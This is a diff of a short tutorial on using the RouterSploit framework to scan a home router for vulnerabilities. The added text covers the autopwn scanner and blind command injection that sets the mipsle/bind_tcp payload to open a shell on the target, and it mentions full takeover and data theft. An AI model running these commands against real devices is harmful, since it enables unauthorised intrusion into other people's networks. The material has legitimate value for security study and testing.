@@ -1,6 +1,7 @@
 /*Using Routersploit to detect vulnerabilities in a router  
 
-Firstly, you must install routersploit this can be done by entering the following commands in the root terminal. If you are using the main terminal ‘sudo’ may be required to execute these commands: */ 
+Firstly, you must install routersploit this can be done by entering the following commands in the root terminal. 
+If you are using the main terminal ‘sudo’ may be required to execute these commands: */ 
 
 apt-get install python3-pip 
 
@@ -54,6 +55,34 @@ Set target 192.168.0.186 //the ip of my target vulnerable device
 
 Run 
 
-/*If successful in your exploit you will be able to perform blind command injection meaning you will be able to execute commands on the router but cannot 
-see the output. You will notice the terminals rsf> has now become cmd> . Through this Blind Command Injection, you can open a reverse connection, override
-the original access command, perform a complete takeover of the system, steal sensitive data and perform many other malicious acts*/ 
+// The second Method is perfromed similarly to the first but instead of using scanners/routers/router_scan you can use scanners/autopwn
+
+//Second Method Commands:
+
+cd routersploit
+
+python3 rsf.py
+
+use scanners/autopwn
+
+show options
+
+set target 192.168.0.1 //use your network ip 
+
+run
+
+//After this is run just like the scanners/routers/router_scan method you will be shown any vulnerabilities that have been found as well as 
+//how to exploit them to gain access to the target and perform Blind Command Injection.
+
+//Performing Blind Command Injection on the target
+
+Once you have gained access to the cmd line for your target you can enter the following commands
+
+show payloads // this will list the payloads available to use and provide details about each payload
+set payload <payload> // this command is used to select the payload from your shown options e.g to use the default payload MIPSLE Bind TCP Payload to create an interactive tcp bind shell for MIPSLE architecture
+set payload mipsle/bind_tcp // is the command you will use followed by 
+run //this will execute the payload on the target.
+
+/*Since you are perfroming Blind Command Injection you cannot see the output. Through this Blind Command Injection, you can open a reverse connection, override
+the original access command, perform a complete takeover of the system, steal sensitive data and perform many other malicious acts 
+depending on the payloads you have at your disposal*/ 
